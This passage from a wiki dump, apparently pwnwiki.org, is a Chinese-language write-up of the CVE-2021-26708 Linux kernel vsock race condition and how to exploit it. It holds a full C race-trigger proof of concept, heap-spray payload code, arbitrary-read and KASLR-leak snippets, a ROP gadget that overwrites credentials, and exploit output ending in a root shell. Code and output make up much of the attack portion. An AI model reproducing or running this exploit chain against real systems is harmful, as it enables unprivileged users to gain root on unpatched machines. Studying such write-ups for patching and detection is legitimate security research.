前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/translate&gt;

&lt;translate&gt;
==內核信息洩露== &lt;!--T:20--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:21--&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/translate&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:22--&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/translate&gt;

&lt;translate&gt;
==實現任意讀== &lt;!--T:23--&gt;
&lt;/translate&gt;

&lt;translate&gt;
===從 arbitrary free 到 use-after-free=== &lt;!--T:24--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:25--&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/translate&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:26--&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/translate&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:27--&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/translate&gt;

&lt;translate&gt;
===任意讀的步驟=== &lt;!--T:28--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:29--&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/translate&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;translate&gt;
&lt;!--T:30--&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/translate&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;translate&gt;
&lt;!--T:31--&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/translate&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;translate&gt;
==尋找攻擊目標== &lt;!--T:32--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:33--&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。

&lt;!--T:34--&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/translate&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;translate&gt;
==在 sk_buff 上實現 Use-after-free== &lt;!--T:35--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:36--&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。

&lt;!--T:37--&gt;
我構建了以下步驟：

&lt;!--T:38--&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字

&lt;!--T:39--&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()

&lt;!--T:40--&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()

&lt;!--T:41--&gt;
4.對vsock_sock執行任意讀取過程

&lt;!--T:42--&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)

&lt;!--T:43--&gt;
6.對這個可能的sk_buff地址執行任意讀

&lt;!--T:44--&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6

&lt;!--T:45--&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上

&lt;!--T:46--&gt;
9.對sk_buff內核地址進行任意釋放

&lt;!--T:47--&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads

&lt;!--T:48--&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/translate&gt;

&lt;translate&gt;
==通過skb_shared_info 進行任意寫== &lt;!--T:49--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:50--&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/translate&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:51--&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/translate&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;translate&gt;
&lt;!--T:52--&gt;
下面講講destructor_arg 回調:
&lt;/translate&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:53--&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。

&lt;!--T:54--&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/translate&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;translate&gt;
==視頻== &lt;!--T:55--&gt;
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;

&lt;translate&gt;

==參考== &lt;!--T:56--&gt;
&lt;/translate&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ae5vhtig5rw7mjrl5krigls54ncjkku</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/ar</title>
    <ns>0</ns>
    <id>2250</id>
    <revision>
      <id>2680</id>
      <timestamp>2021-05-06T04:58:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-26708 Linux kernel قبل 5.10.13 ارتفاع ثغرة الامتياز"</comment>
      <origin>2680</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27242" sha1="r94psivsalt1rqm71bjwnszgxzssjvz" xml:space="preserve">&lt;languages  /&gt;
== الضعف ==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/div&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內存破壞==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/div&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/div&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/div&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/div&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==模糊測試==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
